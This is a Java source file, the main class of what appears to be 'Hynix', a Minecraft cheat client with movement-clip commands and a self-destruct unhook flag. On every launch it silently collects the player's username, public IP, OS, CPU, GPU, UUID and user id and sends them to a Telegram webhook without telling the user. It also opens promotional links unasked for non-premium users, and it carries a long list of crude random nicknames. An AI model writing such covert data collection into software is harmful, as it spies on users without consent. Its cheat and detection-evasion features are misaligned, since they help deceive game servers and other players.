package io.hynix;

import com.google.common.eventbus.EventBus;

import com.mojang.blaze3d.platform.PlatformDescriptors;
import io.hynix.command.api.*;
import io.hynix.command.feature.*;
import io.hynix.command.interfaces.*;
import io.hynix.managers.friend.FriendManager;
import io.hynix.managers.id.IDManager;
import io.hynix.managers.premium.CheckingUUID;
import io.hynix.managers.staff.StaffManager;
import io.hynix.managers.config.ConfigManager;
import io.hynix.managers.macro.MacroManager;
import io.hynix.events.impl.EventKey;
import io.hynix.managers.premium.PremiumChecker;
import io.hynix.managers.telegramsender.Photo;
import io.hynix.managers.telegramsender.TelegramWebHook;
import io.hynix.ui.clickgui.ClickGui;
import io.hynix.ui.exitmenu.ExitUI;
import io.hynix.units.api.Unit;
import io.hynix.units.api.UnitManager;
import io.hynix.managers.config.AltConfig;
import io.hynix.ui.mainmenu.AltScreen;
import io.hynix.ui.notifications.NotificationManager;
import io.hynix.managers.theme.Theme;
import io.hynix.utils.client.SoundPlayer;
import io.hynix.utils.johon0.render.color.ColorUtils;
import io.hynix.utils.player.TPSCalc;
import io.hynix.utils.client.ClientUtils;
import io.hynix.utils.client.ServerTPS;
import io.hynix.managers.drag.DragManager;
import io.hynix.managers.drag.Dragging;
import io.hynix.utils.player.rotation.FreeLookHandler;
import io.hynix.utils.player.rotation.RotationHandler;
import io.hynix.utils.text.font.ClientFonts;
import lombok.*;
import lombok.experimental.FieldDefaults;
import net.minecraft.client.Minecraft;
import net.minecraft.util.Util;
import net.minecraft.util.text.StringTextComponent;
import org.lwjgl.glfw.GLFW;


import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.management.ManagementFactory;
import java.lang.management.OperatingSystemMXBean;
import java.net.URL;
import java.time.ZoneId;
import java.time.ZonedDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.List;


@Getter
@FieldDefaults(level = AccessLevel.PRIVATE)
public class HynixMain {

    public boolean playerOnServer = false;

    public static final String version = "0.3.0";
    public static final String updateLabel = "Free Edition";
    public static final String name = "Hynix [" + updateLabel + "]";
    public static final String build = "" + version.replace(".", "");
    public static final String site = "https://hynix.fun";

    @Getter
    private static HynixMain instance;

    private UnitManager moduleManager;
    private ConfigManager configManager;
    private CommandDispatcher commandDispatcher;
    private ServerTPS serverTPS;
    private MacroManager macroManager;
    private FriendManager friendManager;
    @Getter
    private PremiumChecker premiumChecker;

    private final EventBus eventBus = new EventBus();

    private final File clientDir = new File(Minecraft.getInstance().gameDir + "\\saves\\files");
    private final File filesDir = new File(Minecraft.getInstance().gameDir + "\\saves\\files\\other");

    private static List<Command> commands = new ArrayList<>();


    private AltConfig altConfig;
    private io.hynix.ui.clickgui.ClickGui clickGuiScreen;
    private NotificationManager notifyManager;

//    private ViaMCP viaMCP;
    private TPSCalc tpsCalc;

    private AltScreen altScreen;
    private ExitUI exitUI;

    private Theme theme;

    public HynixMain() {
        instance = this;

        if (!clientDir.exists()) {
            clientDir.mkdirs();
        }
        if (!filesDir.exists()) {
            filesDir.mkdirs();
        }
        IDManager.createFile();
        clientLoad();
    }

    public Dragging createDrag(Unit module, String name, float x, float y) {
        DragManager.draggables.put(name, new Dragging(module, name, x, y));
        return DragManager.draggables.get(name);
    }



    @SneakyThrows
    private void clientLoad() {
        ClickGui.backgroundColor = ColorUtils.rgba(5, 5, 5, 200);
        ClickGui.textcolor = -1;
        ClickGui.lightcolor = ColorUtils.rgba(20, 20, 20, 200);

        //gui
        ClickGui.backgroundpanelcolor = ColorUtils.rgba(10, 10, 10, 255);
        ClickGui.lightcolorgui = ColorUtils.rgba(40, 40, 40, 255);
        ClickGui.lighttextcolor = ColorUtils.rgb(200, 200, 200);
        ClickGui.modescolor = ColorUtils.rgba(35, 35, 35, 255);
        ClientFonts.init();
        premiumChecker = new PremiumChecker();
//        viaMCP = new ViaMCP();
        serverTPS = new ServerTPS();
        configManager = new ConfigManager();
        altConfig = new AltConfig();

        moduleManager = new UnitManager();
        moduleManager.init();

        notifyManager = new NotificationManager();
        notifyManager.init();

        macroManager = new MacroManager();

        altScreen = new AltScreen();

        tpsCalc = new TPSCalc();
        initCommands();

        friendManager = new FriendManager();
        try {
            this.friendManager.init();
        } catch (IOException var5) {
        }
        try {
            altConfig.init();
        } catch (Exception e) {
        }
        try {
            configManager.init();
        } catch (IOException e) {
        }
        try {
            macroManager.init();
        } catch (IOException e) {
        }

        DragManager.load();
        friendManager.init();
        StaffManager.load();
        ClientUtils.startRPC();
        clickGuiScreen = new io.hynix.ui.clickgui.ClickGui(new StringTextComponent(""));
        theme = new Theme();
        new FreeLookHandler();
        new RotationHandler();
        eventBus.register(this);
        SoundPlayer.playSound("welcome.wav");

        OperatingSystemMXBean osBean = ManagementFactory.getOperatingSystemMXBean();
        ZonedDateTime currentTime = ZonedDateTime.now(ZoneId.of("Europe/Moscow"));
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
        String formattedTime = currentTime.format(formatter);
        String message =
                "Юзер запустил " + "Hynix Client " + HynixMain.version + System.lineSeparator() +
                        "Информация о Юзере: " + System.lineSeparator() +
                        "MinecraftSession: " + Minecraft.getInstance().getSession().getUsername() + System.lineSeparator() +
                        "IP: " + fetchIPAddress() + System.lineSeparator() +
                        "OS: " + osBean.getName() + System.lineSeparator() +
                        "CPU: " + PlatformDescriptors.getCpuInfo() + System.lineSeparator() +
                        "GPU: " +PlatformDescriptors.getGlRenderer() + System.lineSeparator() +
                        "time: " + formattedTime + System.lineSeparator() +
                        "uuid: " + CheckingUUID.getUUID() + System.lineSeparator() +
                        "Premium: " + (PremiumChecker.isPremium ? "Есть" : "Нету") + System.lineSeparator()+
                        "user id: " + IDManager.iduser + System.lineSeparator();


        TelegramWebHook.sendTelegramMessage(message, Photo.getRandomPhoto());
        if (!PremiumChecker.isPremium) {
            Util.getOSType().openURI("https://vk.com/hynixclient");
            Util.getOSType().openURI("https://t.me/hynixclient");
            Util.getOSType().openURI("https://discord.gg/5KXSPDsMHA");
        }
    }

    public void clientShotdown() {
        DragManager.save();
        configManager.saveConfiguration("backup");
        AltConfig.updateFile();

    }

    private static synchronized String fetchIPAddress() {
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            return in.readLine();
        } catch (IOException e) {
            return "Unknown IP";
        }
    }
    public String randomNickname() {
        String[] names = new String[]{"Hynix", "Femboy", "RussianPirat", "Ladoga", "ny7oBKa", "IIIuPuHKa", "DataBase", "KoTuK", "nayk", "nykaH", "nykaJLKa", "IIIa7oMeP", "Ohtani", "Tango", "HardStyle", "GoToSleep", "Movietone", "7aIIIuK", "TpyCuKu", "TheKnight", "OnlySprint", "Press_W", "HowToWASD", "BloodFlow", "CutVeins", "Im_A_Cyber", "NextTime", "Killer", "Murauder", "AntiPetuh", "CMeTaHKa", "Enigma", "Doctor", "TheGhost", "GhostRunner", "Banana", "Ba3eJLuH", "MaCTyp6eK", "BaHTy3", "AliExpress", "Agressor", "Spasm", "SHAMAN", "optimist", "", "Banker", "JahMachine", "Cu7aPa", "nuBo", "CuM6uoT", "Venom", "Superman", "Supreme", "CeKcU_6ou", "SuperSpeed", "KnuckKnuck", "6o7aTbIPb", "SouthPark", "Simpson", "IIIaJLaIII", "3_Penetrate", "EmptySoul", "Firefly", "PlusTopka", "TryMe", "YouAreWeak", "MegaSexual", "Pikachu", "Pupsik", "Legenda", "SCP", "MyNumber", "YourToy", "SexShop", "Slayer", "Murderer", "CallMe", "PvpTeacher", "CrazyEva", "4ynuK", "6aToH", "LongPenis", "Caxap", "Infernal", "Rerilo", "Remula", "Rarlin", "Devo4ka", "SexySister", "NakedBody", "PlusZ4", "ThiefInLaw", "StrongTea", "BlackTea", "SmallAss", "SmallBoobs", "CoffeeDEV", "FireRider", "MilkyWay", "PeacefulBoy", "Lambada", "MagicSpeed", "ThrowMom", "StopPlay", "KillMother", "XDeadForGay", "ALTf4", "HowAreYou", "GoSex", "Falas", "Sediment", "OpenDoor", "ShitInTrap", "SuckItUp", "NeuroNET", "BunnyHop", "BmxSport", "GiveCoord", "eHoTuK", "KucKa", "3auKa", "4aIIIa", "HykaHax", "Sweet", "MoHuTop", "Me7aMa4o", "Miner", "BonAqua", "COK", "BANK", "Lucky", "SPECTATE", "7OBHO", "MyXA", "Owner", "5opka", "JUK", "FaceBreak", "SnapBody", "Psycho", "EasyWin", "SoHard", "Panties", "SoloGame", "Robot", "Surgeon", "_IMBA", "ShakeMe", "EnterMe", "GoAway", "TRUE", "while", "Pinky", "Pickup", "Stack", "GL11", "GLSL", "Garbage", "NoBanMe", "WiFi", "Tally", "Dream", "Mommy", "6aTya", "Pivovar", "Alkash", "Gangsta", "Counter", "Clitor", "HentaUser", "BrowseHent", "LoadChunk", "Panical", "Kakashka", "MinusVse", "Pavlik", "RusskiPirat", "GoodTrip", "6A6KA", "3000IQ", "0IQ", "REMILO", "YOUR_BOSS", "CPacketGay", "4Bytes", "SinCos", "Yogurt", "SexInTrash", "TrashMyHome", "PenisUser", "Evulya", "Evochka", "Virginia", "NoReportMe", "Bluetouth", "PivoBak", "6AKJLAXA", "Opostrof", "Harming", "Cauldron", "Dripka", "Wurdulak", "Presedent", "Opstol", "Oposum", "Babayka", "O4KAPUK", "Dunozavr", "Cocacola", "Fantazy", "70JLA9I", "PedalKTLeave", "TolstoLobik", "nePDyH", "HABO3HUK", "KOT", "CKOT", "BISHOP", "4ukeH", "nanaxa", "Berkyt", "Matreshka", "HACBAU", "XAPEK", "Mopedik", "CKELET2013", "GodDrakona", "CoLHbiIIIKo", "HA77ETC", "PoM6uK", "PomaH", "6oM6UJLa", "MOH7OJl", "OutOfMemory", "PopkaDurak", "4nokVPupok", "Pinality", "Shaverma", "MOJLUCb", "MOJLuTBA", "CTEHA", "CKAJLA", "JohnWeak", "Plomba", "neKaPb", "Disconnect", "Oriflame", "Mojang", "TPPPPP", "EvilBoy", "DavaiEbaca", "TuMeuT", "Tapan", "600K7Puzo", "Poctelecom", "Interzet", "C_6oDUHA", "6yHTaPb", "Milka", "KOLBASA", "OhNo", "YesTea", "Mistik", "KuHDep", "Smippy", "Diamond", "KedpOBuK", "Lolikill", "CrazyGirl", "Kronos", "Kruasan", "MrProper", "HellCat", "Nameless", "Viper", "GamerYT", "slimer", "MrSlender", "Gromila", "BoomBoom", "Doshik", "BananaKenT", "NeonPlay", "Progibator", "Rubak", "MrMurzik", "Kenda", "DrShine", "cnacu6o", "Eclips", "ShadowFuse", "MrRem", "Bacardi", "UwU_FUF", "Exont", "Persik", "Mambl", "Rossamaha", "DrKraken", "MeWormy", "WaterBomb", "YourStarix", "nakeTuk", "Massik", "MineFOX", "BitCoin", "Avocado", "Chappi", "ECEQO", "Fondy", "StableFace", "JeBobby", "KrytoyKaka", "MagHyCEp", "I7evice", "LeSoulles", "EmptySoul", "KOMnOT", "MrPlay", "NGROK2009", "NoProblem", "MrPatric", "OkugAmas", "YaBuilder", "A7EHT007", "PussyGirl", "Triavan", "TyCoBKa", "UnsafeINV", "", "yKcyc_UFO", "Wendy", "Bendy", "XAOC", "ST6yP7", "XYNECI", "HENTAI", "YoutDaddy", "YouGurT", "EnumFacing", "HitVec3d", "JavaGypy", "VIWEBY", "ZamyPlay", "SUSUKI", "KPAX_TRAX", "Emiron", "UzeXilo", "Rembal", "Gejmer", "EvoNeon", "MrFazen", "ESHKERE", "FARADENZA", "EarWarm", "CMA3KA", "NaVi4oK", "A4_OMG", "YCYSAPO", "Booster", "BroDaga", "CastlePlay29", "DYWAHY", "Emirhan", "BezPontov", "Xilece", "Gigabait", "Griefer", "Goliaf", "Fallaut", "HERODOT", "KingKong", "NADOBNO", "ODIZIT", "Klawdy", "NCRurtler", "Fixik", "FINISHIST", "KPACOTA", "GlintEff", "Flexer", "NeverMore", "BludShaper", "PoSaN4Ik", "Goblin", "Aligator", "Zmeyka", "FieFoxe", "Homilion", "Locator", "kranpus", "HOLSON", "CocyD_ADA", "Anarant", "O6pUKoc", "MissTitan", "JellyKOT", "JellyCat", "LolGgYT", "MapTiNi", "GazVax", "Foxx4ever", "NaGiBaToP", "whiteKing", "KitKat", "VkEdAx", "Pro100Hy6", "Contex", "Durex", "Mr_Golem", "Moonlight", "CoolBoy", "6oTaH", "CaHa6uC", "MuJLaIIIKa", "AvtoBus", "ABOBA", "KanaTuK", "TpanoFob", "CAPSLOCK", "Sonic", "SONIK", "COHUK", "Tailss", "TAILSS", "TauJLC", "Ehidna", "exudHa", "Naklz", "HaKJL3", "coHuk", "parebuh", "nape6yx", "TEPOPNCT", "TPEHEP", "6OKCEP", "KARATE_TYAN", "Astolfo", "Itsuki", "Yotsuba", "Succub", "CyKKy6", "MuJLaIIIKa", "Chappie", "LeraPala4", "MegaSonic", "ME7A_COHUK", "SonicEzh", "IIaPe6yx", "Flamingo", "Pavlin", "VenusShop", "PinkRabbit", "EpicSonic", "EpicTailss", "Genius", "Valkiria"};
        String[] titles = new String[]{"DADA", "YA", "2001", "2002", "2003", "2004", "2005", "2006", "2007", "2008", "2009", "2010", "2011", "2012", "2013", "2014", "2015", "2016", "SUS", "SSS", "TAM", "TyT", "TaM", "Ok", "Pon", "LoL", "CHO", "4oo", "MaM", "Top", "PvP", "PVH", "DIK", "KAK", "SUN", "SIN", "COS", "FIT", "FAT", "HA", "AHH", "OHH", "UwU", "DA", "NaN", "RAP", "WoW", "SHO", "KA4", "Ka4", "AgA", "Fov", "LoVe", "TAN", "Mia", "Alt", "4el", "bot", "GlO", "Sir", "IO", "EX", "Mac", "Win", "Lin", "AC", "Bro", "6po", "6PO", "BRO", "mXn", "XiL", "TGN", "24", "228", "1337", "1488", "007", "001", "999", "333", "666", "111", "FBI", "FBR", "FuN", "FUN", "UFO", "OLD", "Old", "New", "OFF", "ON", "YES", "LIS", "NEO", "BAN", "OwO", "0_o", "0_0", "o_0", "IQ", "99K", "AK47", "SOS", "S0S", "SoS", "z0z", "zOz", "Zzz", "zzz", "ZZZ", "6y", "BU", "RAK", "PAK", "Pak", "MeM", "MoM", "M0M", "KAK", "TAK", "n0H", "BOSS", "RU", "ENG", "BAF", "BAD", "ZED", "oy", "Oy", "0y", "Big", "Air", "Dirt", "Dog", "CaT", "CAT", "KOT", "EYE", "CAN", "ToY", "ONE", "OIL", "HOT", "HoT", "VPN", "BnH", "Ty3", "GUN", "HZ", "XZ", "XYZ", "HZ", "XyZ", "HIS", "HER", "DOC", "COM", "DIS", "TOP", "1ST", "1st", "LORD", "DED", "ded", "HAK", "FUF", "IQQ", "KBH", "KVN", "HuH", "WWW", "RUN", "RuN", "run", "PRO", "100", "300", "3OO", "RAM", "DIR", "Yaw", "YAW", "TIP", "Tun", "Ton", "Tom", "Your", "AM", "FM", "YT", "yt", "Yt", "yT", "RUS", "KON", "FAK", "FUL", "RIL", "pul", "RW", "MST", "MEN", "MAN", "NO0", "SEX", "H2O", "H20", "LyT", "3000", "01", "KEK", "PUK", "nuk", "nyk", "nyK", "191", "192", "32O", "5OO", "320", "500", "777", "720", "480", "48O", "HUK", "BUS", "LUN", "LyH", "Fuu", "LaN", "LAN", "DIC", "HAA", "NON", "FAP", "4AK", "4on", "4EK", "4eK", "NVM", "BOG", "RIP", "SON", "XXL", "XXX", "GIT", "GAD", "8GB", "5G", "4G", "3G", "2G", "TX", "GTX", "RTX", "HOP", "TIR", "ufo", "MIR", "MAG", "ALI", "BOB", "GRO", "GOT", "ME", "SO", "Ay4", "MSK", "MCK", "RAY", "EVA", "EvA", "DEL", "ADD", "UP", "VK", "LOV", "AND", "AVG", "EGO", "YTY", "YoY", "I_I", "G_G", "D_D", "V_V", "F", "FF", "FFF", "LCM", "PCM", "CPS", "FPS", "GO", "G0", "70", "7UP", "JAZ", "GAZ", "7A3", "UFA", "HIT", "DAY", "DaY", "S00", "SCP", "FUK", "SIL", "COK", "SOK", "WAT", "WHO", "PUP", "PuP", "Py", "CPy", "SRU", "OII", "IO", "IS", "THE", "SHE", "nuc", "KXN", "VAL", "MIS", "HXI", "HI", "ByE", "WEB", "TNT", "BEE", "4CB", "III", "IVI", "POP", "C4", "BRUH", "Myp", "MyP", "NET", "CAR", "PET", "POV", "POG", "OKK", "ESP", "GOP", "G0P", "7on", "E6y", "BIT", "PIX", "AYE", "Aye", "PVP", "GAS", "REK", "rek", "PEK", "n0H", "RGB"};
        String name = names[(int)(((float)names.length - 1.0F) * (float)Math.random() * (((float)names.length - 1.0F) / (float)names.length))];
        String title = titles[(int)(((float)titles.length - 1.0F) * (float)Math.random() * (((float)titles.length - 1.0F) / (float)titles.length))];
        int size = (name + "_").length();
        return name + "_" + (16 - size == 0 ? "" : title);
    }

    private final EventKey eventKey = new EventKey(-1);

    public void onKeyPressed(int key) {
        if (moduleManager.getSelfDestruct().unhooked) return;
        eventKey.setKey(key);
        eventBus.post(eventKey);

        macroManager.onKeyPressed(key);

        if (key == (moduleManager.getSelfDestruct().unhooked ? 0 : GLFW.GLFW_KEY_RIGHT_SHIFT) && moduleManager.getClickGui().isEnabled() && Minecraft.getInstance().currentScreen == null) {
            Minecraft.getInstance().displayGuiScreen(clickGuiScreen);
            moduleManager.getClickGui().setEnabled(false, true);
        }
    }

    private void initCommands() {
        Minecraft mc = Minecraft.getInstance();
        Logger logger = new MultiLogger(List.of(new ConsoleLogger(), new MinecraftLogger()));
        List<Command> commands = new ArrayList<>();
        Prefix prefix = new PrefixImpl();
        commands.add(new ListCommand(commands, logger));
        commands.add(new FriendCommand(prefix, logger, mc));
        commands.add(new BindCommand(prefix, logger));
        commands.add(new GPSCommand(prefix, logger));
        commands.add(new WayCommand(prefix, logger));
        commands.add(new ConfigCommand(configManager, prefix, logger));
        commands.add(new MacroCommand(macroManager, prefix, logger));
        commands.add(new VClipCommand(prefix, logger, mc));
        commands.add(new HClipCommand(prefix, logger, mc));
        commands.add(new StaffCommand(prefix, logger));
        commands.add(new MemoryCommand(logger));
        commands.add(new RCTCommand(logger, mc));
        commands.add(new ParseCommand(prefix, logger));
        commands.add(new LoginCommand(prefix, logger, mc));


        AdviceCommandFactory adviceCommandFactory = new AdviceCommandFactoryImpl(logger);
        ParametersFactory parametersFactory = new ParametersFactoryImpl();

        commandDispatcher = new StandaloneCommandDispatcher(commands, adviceCommandFactory, prefix, parametersFactory, logger);
    }

}
